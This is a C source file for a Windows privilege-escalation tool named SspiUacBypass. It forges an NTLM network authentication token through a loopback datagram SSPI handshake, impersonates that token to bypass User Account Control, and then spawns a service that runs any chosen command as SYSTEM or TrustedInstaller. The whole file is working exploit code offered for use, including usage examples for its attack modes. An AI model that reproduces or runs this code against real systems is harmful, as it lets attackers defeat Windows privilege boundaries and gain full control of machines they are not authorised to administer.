#define SECURITY_WIN32

#include <Windows.h>
#include <stdio.h>
#include <Security.h>
#include "CreateSvcRpc.h"
#include "PrivilegeHelpers.h"
#include "UserHelpers.h"

#define SEC_SUCCESS(Status) ((Status) >= 0)
#define MAX_MESSAGE_SIZE 12000

#pragma comment (lib, "Secur32.lib")

HANDLE ForgeNetworkAuthToken();
void CheckTokenSession(HANDLE hToken);
BOOL IsThreadTokenIdentification();
int HandleServiceMode(int argc, char* argv[]);

void PrintUsage() {
    printf("\nUsage:\n");
    printf("  SspiUacBypass.exe [options] <command>\n\n");
    printf("Options:\n");
    printf("  -i, --interactive         Execute in user session (WinSta0\\Desktop)\n");
    printf("  -t, -ti, --trustedinstaller  Execute with TrustedInstaller privileges\n");
    printf("  --service-mode            Internal flag (do not use manually)\n\n");
    printf("Examples:\n");
    printf("  SspiUacBypass.exe cmd.exe                     # Standard UAC bypass (SYSTEM, Session 0)\n");
    printf("  SspiUacBypass.exe -i cmd.exe                  # Interactive mode (SYSTEM, User Session)\n");
    printf("  SspiUacBypass.exe -t cmd.exe                  # TrustedInstaller mode (Session 0)\n");
    printf("  SspiUacBypass.exe -t -i cmd.exe               # TrustedInstaller + Interactive\n");
    printf("  SspiUacBypass.exe -i notepad.exe file.txt     # Multiple arguments supported\n");
}

int main(int argc, char* argv[])
{
    char defaultCmdline[] = "cmd.exe";
    char* cmdline = NULL;
    HANDLE hNetworkToken = INVALID_HANDLE_VALUE;
    BOOL bInteractive = FALSE;
    BOOL bTrustedInstaller = FALSE;
    int argIndex = 1;

    printf("\n\tSspiUacBypass - Enhanced UAC Bypass Tool\n\tby @regiolis (enhanced)\n\n");

    // Check for service mode (internal call)
    if (argc > 1 && strcmp(argv[1], "--service-mode") == 0) {
        return HandleServiceMode(argc, argv);
    }

    // Parse all flags first
    while (argIndex < argc) {
        if (strcmp(argv[argIndex], "-i") == 0 || strcmp(argv[argIndex], "--interactive") == 0) {
            bInteractive = TRUE;
            argIndex++;
        }
        else if (strcmp(argv[argIndex], "-ti") == 0 || strcmp(argv[argIndex], "--trustedinstaller") == 0 ||
            strcmp(argv[argIndex], "-t") == 0) {
            bTrustedInstaller = TRUE;
            argIndex++;
        }
        else if (strcmp(argv[argIndex], "-h") == 0 || strcmp(argv[argIndex], "--help") == 0) {
            PrintUsage();
            return 0;
        }
        else {
            // This should be the command - break and use remaining args
            break;
        }
    }

    // Build command line from remaining arguments
    if (argIndex < argc) {
        // Calculate total length needed
        int totalLen = 0;
        for (int i = argIndex; i < argc; i++) {
            totalLen += strlen(argv[i]) + 1; // +1 for space or null terminator
        }

        // Allocate buffer
        cmdline = (char*)malloc(totalLen + 1);
        if (cmdline) {
            strcpy_s(cmdline, totalLen + 1, argv[argIndex]);
            for (int i = argIndex + 1; i < argc; i++) {
                strcat_s(cmdline, totalLen + 1, " ");
                strcat_s(cmdline, totalLen + 1, argv[i]);
            }
        }
        else {
            cmdline = defaultCmdline;
        }
    }
    else {
        cmdline = defaultCmdline;
    }

    if (!IsMemberOfAdminGroup()) {
        printf("This account must belongs to Administrators group, exiting...\n");
        if (cmdline != defaultCmdline) free(cmdline);
        return -1;
    }

    if (!HasPassword()) {
        printf("This account must have a password set, exiting...\n");
        if (cmdline != defaultCmdline) free(cmdline);
        return -1;
    }

    // Display mode
    printf("Mode: ");
    if (bTrustedInstaller) printf("TrustedInstaller ");
    else printf("SYSTEM ");

    if (bInteractive) printf("+ Interactive (User Session)\n");
    else printf("(Session 0)\n");

    printf("Command: %s\n\n", cmdline);

    // Check if already elevated
    if (IsElevated()) {
        printf("Process is already elevated.\n");

        if (bTrustedInstaller) {
            if (IsTrustedInstaller()) {
                printf("Already running as TrustedInstaller! Executing command directly...\n");
                if (bInteractive) {
                    // Execute in user session
                    DWORD sessionId = GetCurrentUserSessionId();
                    HANDLE hToken = NULL;
                    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
                    CreateProcessInUserSession(hToken, cmdline, sessionId);
                    CloseHandle(hToken);
                }
                else {
                    system(cmdline);
                }
                if (cmdline != defaultCmdline) free(cmdline);
                return 0;
            }

            printf("Attempting to escalate from elevated to TrustedInstaller...\n");
            int result = InvokeCreateSvcRpcMainWithOptions(cmdline, bInteractive, bTrustedInstaller);
            if (cmdline != defaultCmdline) free(cmdline);
            return result;
        }
        else {
            printf("Executing command as elevated user...\n");
            int result = InvokeCreateSvcRpcMainWithOptions(cmdline, bInteractive, FALSE);
            if (cmdline != defaultCmdline) free(cmdline);
            return result;
        }
    }

    // Perform UAC bypass
    printf("Forging a token from a fake Network Authentication through Datagram Contexts\n");
    hNetworkToken = ForgeNetworkAuthToken();
    if (hNetworkToken == INVALID_HANDLE_VALUE) {
        printf("Cannot forge the network auth token, exiting...\n");
        if (cmdline != defaultCmdline) free(cmdline);
        return -1;
    }

    printf("Network Authentication token forged correctly, handle --> 0x%x\n", hNetworkToken);
    CheckTokenSession(hNetworkToken);
    ImpersonateLoggedOnUser(hNetworkToken);

    if (IsThreadTokenIdentification()) {
        printf("Impersonating the forged token returned an Identification token. Bypass failed :(\n");
        RevertToSelf();
        CloseHandle(hNetworkToken);
        if (cmdline != defaultCmdline) free(cmdline);
        return -1;
    }

    printf("Bypass Success! Now impersonating the forged token...\n");

    // Create service that calls ourselves in service mode
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    char serviceCmd[1024];
    _snprintf_s(serviceCmd, sizeof(serviceCmd), _TRUNCATE,
        "\"%s\" --service-mode %s %s \"%s\"",
        selfPath,
        bInteractive ? "--interactive" : "",
        bTrustedInstaller ? "--trustedinstaller" : "",
        cmdline);

    printf("Spawning service with command: %s\n", serviceCmd);
    printf("Self path: %s\n", selfPath);
    printf("Original command: %s\n", cmdline);

    int result = InvokeCreateSvcRpcMain(serviceCmd);

    RevertToSelf();
    CloseHandle(hNetworkToken);
    if (cmdline != defaultCmdline) free(cmdline);
    return result;
}

// Handle execution from within the service
int HandleServiceMode(int argc, char* argv[]) {
    BOOL bInteractive = FALSE;
    BOOL bTrustedInstaller = FALSE;
    char* cmdline = "cmd.exe";

    printf("\n\tService Mode - Running as SYSTEM\n\n");

    // Parse service mode arguments - much simpler parsing
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "--interactive") == 0) {
            bInteractive = TRUE;
        }
        else if (strcmp(argv[i], "--trustedinstaller") == 0) {
            bTrustedInstaller = TRUE;
        }
        else {
            // Everything else is the command
            cmdline = argv[i];
            break;
        }
    }

    printf("Service executing: %s\n", cmdline);
    printf("Interactive: %s\n", bInteractive ? "Yes" : "No");
    printf("TrustedInstaller: %s\n", bTrustedInstaller ? "Yes" : "No");

    // Verify we're running elevated (should be SYSTEM in service context)
    if (!IsElevated()) {
        printf("ERROR: Service mode should be running elevated!\n");
        return -1;
    }

    printf("Confirmed: Running as elevated (SYSTEM)\n");

    if (bTrustedInstaller) {
        printf("\n=== TrustedInstaller Mode ===\n");

        // Start TrustedInstaller service
        printf("Starting TrustedInstaller service...\n");
        if (!StartTrustedInstallerService()) {
            printf("Failed to start TrustedInstaller service\n");
            return -1;
        }

        // Wait for service to be ready
        Sleep(3000);

        // Get TrustedInstaller token
        printf("Obtaining TrustedInstaller token...\n");
        HANDLE hTIToken = GetTrustedInstallerToken();
        if (hTIToken == INVALID_HANDLE_VALUE) {
            printf("Failed to obtain TrustedInstaller token\n");
            return -1;
        }

        printf("Successfully obtained TrustedInstaller token!\n");

        if (bInteractive) {
            printf("Creating process in user session with TrustedInstaller privileges...\n");

            // Get active user session
            DWORD sessionId = WTSGetActiveConsoleSessionId();
            if (sessionId == 0xFFFFFFFF) {
                printf("No active console session, executing in Session 0\n");
                CreateProcessAsTrustedInstallerWithToken(hTIToken, cmdline);
            }
            else {
                printf("Active session ID: %d\n", sessionId);
                CreateProcessInUserSession(hTIToken, cmdline, sessionId);
            }
        }
        else {
            printf("Creating process in Session 0 with TrustedInstaller privileges...\n");
            CreateProcessAsTrustedInstallerWithToken(hTIToken, cmdline);
        }

        CloseHandle(hTIToken);

    }
    else {
        printf("\n=== SYSTEM Mode ===\n");

        if (bInteractive) {
            printf("Creating process in user session with SYSTEM privileges...\n");

            // Get current process token
            HANDLE hToken = NULL;
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
                DWORD sessionId = WTSGetActiveConsoleSessionId();
                if (sessionId == 0xFFFFFFFF) {
                    printf("No active console session, executing in Session 0\n");
                    system(cmdline);
                }
                else {
                    printf("Active session ID: %d\n", sessionId);
                    CreateProcessInUserSession(hToken, cmdline, sessionId);
                }
                CloseHandle(hToken);
            }
            else {
                printf("Failed to get process token, using system()\n");
                system(cmdline);
            }
        }
        else {
            printf("Executing in Session 0 with SYSTEM privileges...\n");
            printf("Command: %s\n", cmdline);

            // Simple execution - just run the command as-is
            int result = system(cmdline);
            printf("Command completed with exit code: %d\n", result);
        }
    }

    printf("Service mode execution completed.\n");
    return 0;
}

HANDLE ForgeNetworkAuthToken() {
    CredHandle hCredClient, hCredServer;
    TimeStamp lifetimeClient, lifetimeServer;
    SecBufferDesc negotiateDesc, challengeDesc, authenticateDesc;
    SecBuffer negotiateBuffer, challengeBuffer, authenticateBuffer;
    CtxtHandle clientContextHandle, serverContextHandle;
    ULONG clientContextAttributes, serverContextAttributes;
    SECURITY_STATUS secStatus;
    HANDLE hTokenNetwork = INVALID_HANDLE_VALUE;

    secStatus = AcquireCredentialsHandle(NULL, (LPWSTR)NTLMSP_NAME, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hCredClient, &lifetimeClient);
    if (!SEC_SUCCESS(secStatus)) {
        printf("AcquireCredentialsHandle Client failed with secstatus code 0x%x \n", secStatus);
        exit(-1);
    }

    secStatus = AcquireCredentialsHandle(NULL, (LPWSTR)NTLMSP_NAME, SECPKG_CRED_INBOUND, NULL, NULL, NULL, NULL, &hCredServer, &lifetimeServer);
    if (!SEC_SUCCESS(secStatus)) {
        printf("AcquireCredentialsHandle Server failed with secstatus code 0x%x \n", secStatus);
        exit(-1);
    }

    negotiateDesc.ulVersion = 0;
    negotiateDesc.cBuffers = 1;
    negotiateDesc.pBuffers = &negotiateBuffer;
    negotiateBuffer.cbBuffer = MAX_MESSAGE_SIZE;
    negotiateBuffer.BufferType = SECBUFFER_TOKEN;
    negotiateBuffer.pvBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_MESSAGE_SIZE);
    secStatus = InitializeSecurityContext(&hCredClient, NULL, NULL, ISC_REQ_DATAGRAM, 0, SECURITY_NATIVE_DREP, NULL, 0, &clientContextHandle, &negotiateDesc, &clientContextAttributes, &lifetimeClient);
    if (!SEC_SUCCESS(secStatus)) {
        printf("InitializeSecurityContext Type 1 failed with secstatus code 0x%x \n", secStatus);
        exit(-1);
    }

    challengeDesc.ulVersion = 0;
    challengeDesc.cBuffers = 1;
    challengeDesc.pBuffers = &challengeBuffer;
    challengeBuffer.cbBuffer = MAX_MESSAGE_SIZE;
    challengeBuffer.BufferType = SECBUFFER_TOKEN;
    challengeBuffer.pvBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_MESSAGE_SIZE);
    secStatus = AcceptSecurityContext(&hCredServer, NULL, &negotiateDesc, ASC_REQ_DATAGRAM, SECURITY_NATIVE_DREP, &serverContextHandle, &challengeDesc, &serverContextAttributes, &lifetimeServer);
    if (!SEC_SUCCESS(secStatus)) {
        printf("AcceptSecurityContext Type 2 failed with secstatus code 0x%x \n", secStatus);
        exit(-1);
    }

    authenticateDesc.ulVersion = 0;
    authenticateDesc.cBuffers = 1;
    authenticateDesc.pBuffers = &authenticateBuffer;
    authenticateBuffer.cbBuffer = MAX_MESSAGE_SIZE;
    authenticateBuffer.BufferType = SECBUFFER_TOKEN;
    authenticateBuffer.pvBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_MESSAGE_SIZE);
    secStatus = InitializeSecurityContext(NULL, &clientContextHandle, NULL, 0, 0, SECURITY_NATIVE_DREP, &challengeDesc, 0, &clientContextHandle, &authenticateDesc, &clientContextAttributes, &lifetimeClient);
    if (!SEC_SUCCESS(secStatus)) {
        printf("InitializeSecurityContext Type 3 failed with secstatus code 0x%x \n", secStatus);
        exit(-1);
    }

    secStatus = AcceptSecurityContext(NULL, &serverContextHandle, &authenticateDesc, 0, SECURITY_NATIVE_DREP, &serverContextHandle, NULL, &serverContextAttributes, &lifetimeServer);
    if (!SEC_SUCCESS(secStatus)) {
        printf("AcceptSecurityContext failed with secstatus code 0x%x \n", secStatus);
        exit(-1);
    }
    QuerySecurityContextToken(&serverContextHandle, &hTokenNetwork);

    HeapFree(GetProcessHeap(), 0, negotiateBuffer.pvBuffer);
    HeapFree(GetProcessHeap(), 0, challengeBuffer.pvBuffer);
    HeapFree(GetProcessHeap(), 0, authenticateBuffer.pvBuffer);
    FreeCredentialsHandle(&hCredClient);
    FreeCredentialsHandle(&hCredServer);
    DeleteSecurityContext(&clientContextHandle);
    DeleteSecurityContext(&serverContextHandle);

    return hTokenNetwork;
}

void CheckTokenSession(HANDLE hToken) {
    DWORD retLenght = 0;
    DWORD tokenSessionId = 0;
    if (!GetTokenInformation(hToken, TokenSessionId, &tokenSessionId, sizeof(DWORD), &retLenght)) {
        printf("GetTokenInformation failed with error code %d \n", GetLastError());
        exit(-1);
    }

    if (tokenSessionId == 0)
        printf("Forged Token Session ID set to 0. Older Win version detected...\n");
    else
        printf("Forged Token Session ID set to %d. Token adjusted to current session\n", tokenSessionId);
}

BOOL IsThreadTokenIdentification() {
    HANDLE hTokenImp;
    SECURITY_IMPERSONATION_LEVEL impLevel;
    DWORD retLenght = 0;

    if (!OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hTokenImp)) {
        printf("OpenThreadToken failed with error code %d \n", GetLastError());
        exit(-1);
    }

    if (!GetTokenInformation(hTokenImp, TokenImpersonationLevel, &impLevel, sizeof(SECURITY_IMPERSONATION_LEVEL), &retLenght)) {
        printf("GetTokenInformation failed with error code %d \n", GetLastError());
        exit(-1);
    }

    BOOL result = (impLevel < SecurityImpersonation);
    CloseHandle(hTokenImp);
    return result;
}